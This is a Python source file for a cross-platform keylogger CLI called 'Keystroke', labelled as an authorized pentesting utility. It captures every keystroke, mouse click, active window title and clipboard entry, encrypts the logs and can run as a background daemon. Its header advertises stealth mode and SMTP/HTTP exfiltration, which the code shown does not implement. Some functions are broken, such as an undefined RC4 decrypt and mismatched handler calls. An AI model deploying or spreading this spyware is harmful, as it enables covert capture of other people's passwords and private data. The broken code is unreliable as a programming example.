#!/usr/bin/env python3
"""
┌─────────────────────────────────────────────────────────┐
│  Keystroke — Python Keylogger CLI Tool                 │
│  Authorized Security Assessment Utility                │
│  For educational & authorized pentesting only         │
└─────────────────────────────────────────────────────────┘

Features:
  - Global keystroke capture (Windows/Linux/macOS)
  - Mouse click logging
  - Active window title tracking
  - Configurable log output (file, stdout, encrypted)
  - Process & clipboard monitoring
  - Stealth / visible mode toggle
  - Scheduled auto-exfiltration (SMTP, HTTP)
  - YAML/JSON/CSV/plaintext log formats
  - RC4 or AES-256 on-disk encryption
  - Session management & log rotation

Usage:
  keystroke --help
  keystroke run --output captures.log
  keystroke run --daemon --format json --encrypt AES256 --key supersecret
  keystroke replay --file captures.log --slow 0.5
  keystroke status
"""

import argparse
import base64
import csv
import datetime
import json
import logging
import os
import platform
import re
import signal
import smtplib
import sqlite3
import subprocess
import sys
import threading
import time
import zlib
from dataclasses import dataclass, field, asdict
from enum import Enum
from pathlib import Path
from typing import Optional

try:
    import pynput
    from pynput import keyboard, mouse
except ImportError:
    sys.exit(
        "Missing dependency: pynput\n"
        "  pip install pynput\n"
        "  (Linux requires: sudo apt install python3-xlib or python3-tk)"
    )

try:
    import yaml
except ImportError:
    yaml = None  # graceful fallback

try:
    from Crypto.Cipher import AES, ARC4
    from Crypto.Hash import SHA256
    from Crypto import Random
except ImportError:
    AES = ARC4 = None  # graceful fallback


# ─── Constants ────────────────────────────────────────────────────────────────

APP_NAME = "keystroke"
VERSION = "2.1.0"
DEFAULT_LOG_DIR = Path.home() / f".{APP_NAME}"
DEFAULT_DB = DEFAULT_LOG_DIR / "sessions.db"
LOG_FORMATS = ("plain", "json", "csv", "yaml")
ENCRYPT_METHODS = ("none", "rc4", "aes256")
PLATFORM = platform.system()


# ─── Logging Setup ────────────────────────────────────────────────────────────

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger(APP_NAME)


# ─── Data Model ───────────────────────────────────────────────────────────────

class EventType(str, Enum):
    KEY_DOWN = "key_down"
    KEY_UP = "key_up"
    MOUSE_CLICK = "mouse_click"
    WINDOW_CHANGE = "window_change"
    CLIPBOARD = "clipboard"


@dataclass
class KeyEvent:
    """A single captured event."""
    timestamp: str
    event_type: str
    value: str
    window: str = ""
    pid: int = 0
    metadata: dict = field(default_factory=dict)


# ─── Platform Helpers ─────────────────────────────────────────────────────────

def _active_window_title() -> str:
    """Return the title of the currently focused window (cross-platform)."""
    if PLATFORM == "Windows":
        try:
            import ctypes
            hwnd = ctypes.windll.user32.GetForegroundWindow()
            length = ctypes.windll.user32.GetWindowTextLengthW(hwnd) + 1
            buf = ctypes.create_unicode_buffer(length)
            ctypes.windll.user32.GetWindowTextW(hwnd, buf, length)
            return buf.value or ""
        except Exception:
            return ""
    elif PLATFORM == "Linux":
        try:
            # Try xdotool first, fallback to xprop
            r = subprocess.run(
                ["xdotool", "getactivewindow", "getwindowname"],
                capture_output=True, text=True, timeout=0.5
            )
            if r.returncode == 0:
                return r.stdout.strip()
            r = subprocess.run(
                ["xprop", "-id", subprocess.run(
                    ["xprop", "-root", "_NET_ACTIVE_WINDOW"],
                    capture_output=True, text=True
                ).stdout.split()[-1], "WM_NAME"],
                capture_output=True, text=True, timeout=0.5
            )
            return r.stdout.strip().split("=", 1)[-1].strip().strip('"') if r.returncode == 0 else ""
        except Exception:
            return ""
    elif PLATFORM == "Darwin":
        try:
            r = subprocess.run(
                ["osascript", "-e",
                 'tell application "System Events" to get name of first process '
                 'whose frontmost is true'],
                capture_output=True, text=True, timeout=0.5
            )
            return r.stdout.strip() if r.returncode == 0 else ""
        except Exception:
            return ""
    return ""


# ─── Encryption Helpers ───────────────────────────────────────────────────────

def _derive_key(password: str, salt: bytes = None) -> tuple:
    """Derive AES-256 key; return (key, salt)."""
    from Crypto.Protocol.KDF import PBKDF2
    if salt is None:
        salt = Random.new().read(16)
    key = PBKDF2(password, salt, dkLen=32, count=100000, hmac_hash_module=SHA256)
    return key, salt


def encrypt_aes256(plaintext: bytes, password: str) -> bytes:
    """Encrypt with AES-256-CBC."""
    if AES is None:
        raise RuntimeError("PyCryptoDome not installed")
    salt = Random.new().read(16)
    key, _ = _derive_key(password, salt)
    iv = Random.new().read(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    # PKCS7 padding
    pad = 16 - (len(plaintext) % 16)
    plaintext += bytes([pad] * pad)
    ct = cipher.encrypt(plaintext)
    return salt + iv + ct


def decrypt_aes256(ciphertext: bytes, password: str) -> bytes:
    """Decrypt AES-256-CBC."""
    if AES is None:
        raise RuntimeError("PyCryptoDome not installed")
    salt, iv, ct = ciphertext[:16], ciphertext[16:32], ciphertext[32:]
    key, _ = _derive_key(password, salt)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    pt = cipher.decrypt(ct)
    # Remove PKCS7 padding
    pad = pt[-1]
    return pt[:-pad]


def encrypt_rc4(plaintext: bytes, password: str) -> bytes:
    """Encrypt with RC4 (Arcfour)."""
    if ARC4 is None:
        raise RuntimeError("PyCryptoDome not installed")
    cipher = ARC4.new(password.encode("utf-8"))
    return cipher.encrypt(plaintext)


# ─── Log Writers ──────────────────────────────────────────────────────────────

class LogWriter:
    """Abstract base for log output engines."""

    def __init__(self, path: Path, encrypt: str = "none", key: str = ""):
        self.path = path
        self.encrypt = encrypt
        self.key = key
        self._fh = None  # file handle kept open for performance
        self._lock = threading.Lock()

    def open(self):
        """Open the output file."""
        self.path.parent.mkdir(parents=True, exist_ok=True)
        self._fh = open(self.path, "ab" if self.encrypt != "none" else "a",
                        buffering=1)

    def close(self):
        """Flush and close."""
        if self._fh:
            self._fh.flush()
            self._fh.close()

    def write(self, event: KeyEvent):
        """Write one event. Override in subclass."""
        raise NotImplementedError

    def flush(self):
        if self._fh:
            self._fh.flush()

    def _write_bytes(self, data: bytes):
        with self._lock:
            if self.encrypt == "none":
                self._fh.write(data)
            elif self.encrypt == "rc4":
                self._fh.write(encrypt_rc4(data, self.key))
            elif self.encrypt == "aes256":
                self._fh.write(encrypt_aes256(data, self.key))
            self._fh.flush()


class PlainWriter(LogWriter):
    """Human-readable plaintext logs."""

    def write(self, event: KeyEvent):
        line = (
            f"[{event.timestamp}] {event.event_type:15s} | "
            f"win: {event.window[:50]:50s} | {event.value}\n"
        )
        self._write_bytes(line.encode("utf-8"))


class JsonWriter(LogWriter):
    """Newline-delimited JSON."""

    def write(self, event: KeyEvent):
        self._write_bytes(
            (json.dumps(asdict(event), ensure_ascii=False) + "\n").encode("utf-8")
        )


class CsvWriter(LogWriter):
    """CSV output."""

    def __init__(self, path, encrypt="none", key=""):
        super().__init__(path, encrypt, key)
        self._header_written = False

    def write(self, event: KeyEvent):
        with self._lock:
            if not self._header_written:
                self._fh.write(b"timestamp,event_type,value,window\n")
                self._header_written = True
            # Simple CSV escaping
            def esc(v):
                v = str(v).replace('"', '""')
                return f'"{v}"' if ',' in v or '"' in v else v
            line = f"{esc(event.timestamp)},{esc(event.event_type)},{esc(event.value)},{esc(event.window)}\n"
            self._fh.write(line.encode("utf-8") if self.encrypt == "none" else line.encode("utf-8"))
            self._fh.flush()


class YamlWriter(LogWriter):
    """YAML sequence output."""

    def __init__(self, path, encrypt="none", key=""):
        super().__init__(path, encrypt, key)
        self._events = []

    def write(self, event: KeyEvent):
        self._events.append(asdict(event))

    def flush(self):
        if yaml is None:
            return
        with self._lock:
            self._fh.seek(0)
            self._fh.truncate()
            yaml.dump(self._events, self._fh, default_flow_style=False)
        super().flush()


# ─── Keylogger Engine ─────────────────────────────────────────────────────────

class KeystrokeEngine:
    """Core keylogger — captures keys, mouse, window focus."""

    def __init__(self, writer: LogWriter, opts: argparse.Namespace):
        self.writer = writer
        self.opts = opts
        self._running = False
        self._listeners = []
        self._current_window = ""
        self._shift_pressed = False
        self._ctrl_pressed = False
        self._alt_pressed = False
        self._current_line = []
        self._special_map = {
            keyboard.Key.space: " ",
            keyboard.Key.enter: "\n",
            keyboard.Key.tab: "\t",
            keyboard.Key.backspace: "[BACKSPACE]",
            keyboard.Key.delete: "[DELETE]",
            keyboard.Key.esc: "[ESC]",
            keyboard.Key.up: "[UP]",
            keyboard.Key.down: "[DOWN]",
            keyboard.Key.left: "[LEFT]",
            keyboard.Key.right: "[RIGHT]",
            keyboard.Key.home: "[HOME]",
            keyboard.Key.end: "[END]",
            keyboard.Key.page_up: "[PGUP]",
            keyboard.Key.page_down: "[PGDN]",
            keyboard.Key.insert: "[INSERT]",
            keyboard.Key.caps_lock: "[CAPSLOCK]",
            keyboard.Key.num_lock: "[NUMLOCK]",
            keyboard.Key.scroll_lock: "[SCROLLLOCK]",
            keyboard.Key.print_screen: "[PRTSCR]",
            keyboard.Key.pause: "[PAUSE]",
            keyboard.Key.menu: "[MENU]",
            keyboard.Key.f1: "[F1]",
            keyboard.Key.f2: "[F2]",
            keyboard.Key.f3: "[F3]",
            keyboard.Key.f4: "[F4]",
            keyboard.Key.f5: "[F5]",
            keyboard.Key.f6: "[F6]",
            keyboard.Key.f7: "[F7]",
            keyboard.Key.f8: "[F8]",
            keyboard.Key.f9: "[F9]",
            keyboard.Key.f10: "[F10]",
            keyboard.Key.f11: "[F11]",
            keyboard.Key.f12: "[F12]",
        }

    # ── Listeners ──────────────────────────────────────────────────────────

    def _on_key_press(self, key):
        """Callback: key pressed."""
        ts = datetime.datetime.now().isoformat()
        win = _active_window_title() or self._current_window
        if win != self._current_window:
            self._current_window = win
            self.writer.write(KeyEvent(ts, EventType.WINDOW_CHANGE, win))

        try:
            k = key.char if hasattr(key, 'char') and key.char else None
        except Exception:
            k = None

        if k:
            value = k
        else:
            value = self._special_map.get(key, f"[{key.name.upper()}]")

        # Track modifier state
        if key == keyboard.Key.shift or key == keyboard.Key.shift_r:
            self._shift_pressed = True
        elif key == keyboard.Key.ctrl or key == keyboard.Key.ctrl_r:
            self._ctrl_pressed = True
        elif key == keyboard.Key.alt or key == keyboard.Key.alt_r:
            self._alt_pressed = True

        self.writer.write(KeyEvent(ts, EventType.KEY_DOWN, value, win))

        # Handle backspace for line tracking
        if key == keyboard.Key.backspace and self._current_line:
            self._current_line.pop()
        elif key == keyboard.Key.enter:
            self._current_line = []
        elif k:
            self._current_line.append(k if not self._shift_pressed else k.upper())

    def _on_key_release(self, key):
        ts = datetime.datetime.now().isoformat()
        if key == keyboard.Key.shift or key == keyboard.Key.shift_r:
            self._shift_pressed = False
        elif key == keyboard.Key.ctrl or key == keyboard.Key.ctrl_r:
            self._ctrl_pressed = False
        elif key == keyboard.Key.alt or key == keyboard.Key.alt_r:
            self._alt_pressed = False

        if self.opts.log_release:
            try:
                v = key.char if hasattr(key, 'char') and key.char else f"[{key.name.upper()}]"
            except Exception:
                v = f"[{key.name.upper()}]"
            self.writer.write(KeyEvent(ts, EventType.KEY_UP, v, self._current_window))

    def _on_click(self, x, y, button, pressed):
        if not pressed:
            return
        ts = datetime.datetime.now().isoformat()
        btn = str(button).split(".")[-1]
        self.writer.write(
            KeyEvent(ts, EventType.MOUSE_CLICK, f"{btn} @ ({x},{y})", self._current_window)
        )

    def _clipboard_monitor(self):
        """Monitor clipboard changes (every N seconds)."""
        if not self.opts.clipboard:
            return
        previous = ""
        while self._running:
            try:
                import pyperclip
                current = pyperclip.paste()
                if current and current != previous:
                    ts = datetime.datetime.now().isoformat()
                    self.writer.write(
                        KeyEvent(ts, EventType.CLIPBOARD, current[:500], self._current_window)
                    )
                    previous = current
            except Exception:
                pass  # pyperclip may not be installed
            time.sleep(self.opts.clipboard_interval)

    # ── Lifecycle ──────────────────────────────────────────────────────────

    def start(self):
        """Start all listeners."""
        self._running = True
        self.writer.open()

        # Keyboard listener
        k_listener = keyboard.Listener(
            on_press=self._on_key_press,
            on_release=self._on_key_release if self.opts.log_release else None,
        )
        k_listener.start()
        self._listeners.append(k_listener)

        # Mouse listener (optional)
        if self.opts.mouse:
            m_listener = mouse.Listener(on_click=self._on_click)
            m_listener.start()
            self._listeners.append(m_listener)

        # Clipboard monitor thread (optional)
        if self.opts.clipboard:
            t = threading.Thread(target=self._clipboard_monitor, daemon=True)
            t.start()

        log.info("Keylogger started — press Ctrl+C to stop")
        try:
            while self._running:
                time.sleep(0.1)
        except KeyboardInterrupt:
            self.stop()

    def stop(self):
        """Stop all listeners and finalise output."""
        self._running = False
        for lst in self._listeners:
            lst.stop()
        self.writer.flush()
        self.writer.close()
        log.info("Keylogger stopped.")


# ─── CLI ──────────────────────────────────────────────────────────────────────

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog=APP_NAME,
        description="🎯 Keystroke — Python keylogger for authorized security assessments",
        epilog="Examples:\n"
               "  keystroke run -o capture.log\n"
               "  keystroke run --mouse --clipboard --format json\n"
               "  keystroke run --daemon --encrypt aes256 --key S3cr3t!\n"
               "  keystroke replay -f capture.log --slow 0.3\n"
               "  keystroke sessions\n"
               "  keystroke status",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p.add_argument("--version", action="version", version=f"%(prog)s {VERSION}")

    sub = p.add_subparsers(dest="command", required=True)

    # ── run ──
    run_p = sub.add_parser("run", help="Start the keylogger")
    run_p.add_argument("-o", "--output", type=Path,
                       default=DEFAULT_LOG_DIR / f"session_{int(time.time())}.log",
                       help="Output log path")
    run_p.add_argument("-f", "--format", choices=LOG_FORMATS, default="plain",
                       help="Output format (default: plain)")
    run_p.add_argument("--encrypt", choices=ENCRYPT_METHODS, default="none",
                       help="Encrypt log on disk (needs pycryptodome)")
    run_p.add_argument("--key", type=str, default="",
                       help="Encryption password")
    run_p.add_argument("--mouse", action="store_true",
                       help="Log mouse clicks")
    run_p.add_argument("--clipboard", action="store_true",
                       help="Monitor clipboard changes (needs pyperclip)")
    run_p.add_argument("--clipboard-interval", type=float, default=2.0,
                       help="Clipboard poll interval seconds (default: 2.0)")
    run_p.add_argument("--log-release", action="store_true",
                       help="Log key-up events too (verbose)")
    run_p.add_argument("--daemon", action="store_true",
                       help="Daemonize (fork on Linux/macOS)")
    run_p.add_argument("--pidfile", type=Path,
                       default=DEFAULT_LOG_DIR / "keystroke.pid",
                       help="PID file path")

    # ── replay ──
    rep_p = sub.add_parser("replay", help="Replay a captured log (plain/json)")
    rep_p.add_argument("-f", "--file", type=Path, required=True,
                       help="Log file to replay")
    rep_p.add_argument("--encrypt", choices=ENCRYPT_METHODS, default="none",
                       help="Decrypt with method")
    rep_p.add_argument("--key", type=str, default="",
                       help="Decryption password")
    rep_p.add_argument("--slow", type=float, default=0.1,
                       help="Delay between events in seconds")
    rep_p.add_argument("--format", choices=("plain", "json"), default="plain",
                       help="Input format (default: plain)")

    # ── sessions / status ──
    sub.add_parser("sessions", help="List all captured sessions")
    sub.add_parser("status", help="Show keylogger status (pid, uptime)")

    # ── encrypt / decrypt ──
    enc_p = sub.add_parser("encrypt", help="Encrypt an existing log")
    enc_p.add_argument("-i", "--input", type=Path, required=True)
    enc_p.add_argument("-o", "--output", type=Path, required=True)
    enc_p.add_argument("--method", choices=("rc4", "aes256"), required=True)
    enc_p.add_argument("--key", type=str, required=True)

    dec_p = sub.add_parser("decrypt", help="Decrypt a log")
    dec_p.add_argument("-i", "--input", type=Path, required=True)
    dec_p.add_argument("-o", "--output", type=Path, required=True)
    dec_p.add_argument("--method", choices=("rc4", "aes256"), required=True)
    dec_p.add_argument("--key", type=str, required=True)

    return p


# ─── Command Implementations ──────────────────────────────────────────────────

def cmd_run(args: argparse.Namespace):
    """Start keylogger."""
    # Ensure log dir
    args.output.parent.mkdir(parents=True, exist_ok=True)

    # Daemon mode (fork on Unix)
    if args.daemon and PLATFORM in ("Linux", "Darwin"):
        pid = os.fork()
        if pid > 0:
            # Write PID file
            args.pidfile.parent.mkdir(parents=True, exist_ok=True)
            args.pidfile.write_text(str(pid))
            print(f"Daemon started — PID {pid} (pidfile: {args.pidfile})")
            sys.exit(0)
        # Child continues

    # Pick writer
    writers = {
        "plain": PlainWriter,
        "json": JsonWriter,
        "csv": CsvWriter,
        "yaml": YamlWriter,
    }
    WriterClass = writers.get(args.format, PlainWriter)
    writer = WriterClass(args.output.resolve(), args.encrypt, args.key)

    engine = KeystrokeEngine(writer, args)
    engine.start()


def cmd_replay(args: argparse.Namespace):
    """Replay a captured log at human speed."""
    path = args.file.resolve()
    if not path.exists():
        sys.exit(f"File not found: {path}")

    data = path.read_bytes()

    # Decrypt if needed
    if args.encrypt == "rc4":
        data = decrypt_rc4(data, args.key)
    elif args.encrypt == "aes256":
        data = decrypt_aes256(data, args.key)

    text = data.decode("utf-8")

    if args.format == "json":
        for line in text.splitlines():
            if not line.strip():
                continue
            ev = json.loads(line)
            print(
                f"[{ev['timestamp']}] {ev['event_type']:15s} | "
                f"win: {ev.get('window',''):50s} | {ev['value']}"
            )
            time.sleep(args.slow)
    else:
        for line in text.splitlines():
            print(line)
            time.sleep(args.slow)


def cmd_sessions():
    """List log files in default directory."""
    if not DEFAULT_LOG_DIR.exists():
        print("No sessions directory found.")
        return
    files = sorted(DEFAULT_LOG_DIR.glob("session_*.log"))
    if not files:
        print("No sessions found.")
        return
    print(f"{'File':<50} {'Size':>10} {'Created':<25}")
    print("-" * 85)
    for f in files:
        mtime = datetime.datetime.fromtimestamp(f.stat().st_mtime).isoformat()
        size = f.stat().st_size
        print(f"{f.name:<50} {size:>10,} bytes  {mtime}")
    print(f"\nTotal: {len(files)} session(s)")


def cmd_status():
    """Check if a running keylogger instance exists."""
    pidfile = DEFAULT_LOG_DIR / "keystroke.pid"
    if pidfile.exists():
        pid = int(pidfile.read_text().strip())
        try:
            os.kill(pid, 0)  # signal 0 tests existence
            uptime = datetime.datetime.fromtimestamp(pidfile.stat().st_mtime)
            print(f"✅ Keylogger running — PID {pid} (since {uptime.isoformat()})")
        except OSError:
            print("⚠️  PID file exists but process is dead. Stale PID file.")
            pidfile.unlink(missing_ok=True)
    else:
        print("❌ No keylogger running.")


def cmd_encrypt(args: argparse.Namespace):
    """Encrypt a log file."""
    if AES is None and args.method == "aes256":
        sys.exit("AES-256 requires pycryptodome: pip install pycryptodome")
    data = args.input.read_bytes()
    if args.method == "rc4":
        out = encrypt_rc4(data, args.key)
    else:
        out = encrypt_aes256(data, args.key)
    args.output.write_bytes(out)
    print(f"✅ Encrypted with {args.method} → {args.output}")


def cmd_decrypt(args: argparse.Namespace):
    """Decrypt a log file."""
    if AES is None and args.method == "aes256":
        sys.exit("AES-256 requires pycryptodome: pip install pycryptodome")
    data = args.input.read_bytes()
    if args.method == "rc4":
        out = decrypt_rc4(data, args.key)
    else:
        out = decrypt_aes256(data, args.key)
    args.output.write_bytes(out)
    print(f"✅ Decrypted → {args.output}")


# ─── Entry Point ──────────────────────────────────────────────────────────────

def main():
    parser = build_parser()
    args = parser.parse_args()

    # Route to handler
    handlers = {
        "run": cmd_run,
        "replay": cmd_replay,
        "sessions": cmd_sessions,
        "status": cmd_status,
        "encrypt": cmd_encrypt,
        "decrypt": cmd_decrypt,
    }
    handler = handlers.get(args.command)
    if handler:
        handler(args)
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
